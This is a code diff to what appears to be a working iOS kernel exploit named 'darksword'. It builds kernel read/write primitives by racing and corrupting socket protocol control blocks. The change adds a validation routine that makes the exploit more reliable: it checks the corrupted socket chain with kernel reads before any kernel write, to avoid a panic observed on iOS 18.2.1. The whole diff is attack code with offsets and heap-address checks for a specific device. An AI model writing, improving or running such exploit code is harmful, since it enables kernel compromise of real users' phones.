@@ -108,6 +108,8 @@ static NSMutableArray *socketPorts;
 static NSMutableArray *socketPcbIds;
 static int controlSocket = 0, rwSocket = 0;
 static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
+static int socketCsi = -1;
+static uint64_t gControlSocketAddr = 0, gRwSocketAddr = 0;
 static uint8_t controlData[0x20];
 static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
 static volatile uint8_t writeRequested = 0, writeDone = 0;
@@ -519,6 +521,11 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
         printf("[-] PCB B rejected: no rwSocket candidate at csi+1\n");
         return -1;
     }
+    socketCsi = csi;
+    printf("[+] PCB B accepted: inpNext 0x%llx (csi=%d, control gencnt 0x%llx)\n",
+           inpNext, csi, tg);
+    printf("[+] PCB B expected rw gencnt: 0x%llx\n",
+           [(NSNumber*)socketPcbIds[csi + 1] unsignedLongLongValue]);
 
     rwSocketPcb = inpNext;
     memcpy(wBuf, rBuf, OOB_SIZE);
@@ -1336,6 +1343,43 @@ static bool method_purple_info_leak(void) {
     return ptrsFound > 0;
 }
 
+// Validate the derived socket chain with READ-ONLY operations before any
+// kwrite64. A torn/stale OOB read can make inpNext (rwSocketPcb) land on
+// recycled memory that is NOT the rw socket's live inpcb. The corruption then
+// makes controlSocketPcb -> csa/rsa garbage, and the first kwrite64 turns into
+// a 32-byte write into a MAC-label zone element -> "zone bound checks" panic
+// (observed on iOS 18.2.1 at 0xffffffde00fbfc70). Every read below is sourced
+// from an address already verified to be in the kernel heap GEN region
+// (0xffffffe1xxxxxxxx on this device; MAC labels live at 0xffffffdexxxxxxxx),
+// so a bad chain aborts the attempt instead of panicking.
+static bool validate_krw_sockets(void) {
+    controlSocketPcb = kread64(rwSocketPcb + 0x20); // rw inpcb inp_list.le_next -> control inpcb
+    if ((controlSocketPcb >> 32) != 0xffffffe1ULL || (controlSocketPcb & 0x3ff) != 0) {
+        printf("[-] validate: controlSocketPcb 0x%llx not a kernel-heap inpcb\n", controlSocketPcb);
+        return false;
+    }
+    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
+    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+    if ((csa >> 32) != 0xffffffe1ULL || (rsa >> 32) != 0xffffffe1ULL) {
+        printf("[-] validate: csa 0x%llx / rsa 0x%llx not in kernel heap\n", csa, rsa);
+        return false;
+    }
+    // rwSocketPcb must actually be the rw socket's inpcb: inp_gencnt (0x78)
+    // must equal the gencnt recorded for socketPorts[socketCsi+1] at spray time.
+    uint64_t rwGencnt = kread64(rwSocketPcb + 0x78);
+    uint64_t expect = [(NSNumber*)socketPcbIds[socketCsi + 1] unsignedLongLongValue];
+    if (rwGencnt != expect) {
+        printf("[-] validate: rw inpcb gencnt 0x%llx != expected rw socket 0x%llx (csi=%d)\n",
+               rwGencnt, expect, socketCsi);
+        return false;
+    }
+    printf("[+] validate: controlSocketPcb 0x%llx csa 0x%llx rsa 0x%llx rwgencnt 0x%llx\n",
+           controlSocketPcb, csa, rsa, rwGencnt);
+    gControlSocketAddr = csa;
+    gRwSocketAddr = rsa;
+    return true;
+}
+
 bool run_darksword(void) {
     gMlockDict = [NSMutableDictionary new];
     randomMarker = (uint64_t)arc4random() << 32 | arc4random();
@@ -1416,6 +1460,10 @@ bool run_darksword(void) {
             if (ok) break;
         }
 
+        if (ok) {
+            ok = validate_krw_sockets();
+        }
+
         // PANIC MITIGATION: only release sockets when the attempt FAILED.
         // On success the sockets backing controlSocket/rwSocket (and PCB B)
         // must stay alive; freeing them recycles the inpcb memory, which gets
@@ -1446,9 +1494,8 @@ bool run_darksword(void) {
     pthread_join(freeThread, NULL);
     close(writeFd); close(readFd);
 
-    controlSocketPcb = kread64(rwSocketPcb + 0x20);
-    uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
-    uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+    uint64_t csa = gControlSocketAddr;
+    uint64_t rsa = gRwSocketAddr;
     if (!csa || !rsa) return false;
 
     kwrite64(csa + OFFSET_SOCKET_SO_COUNT,
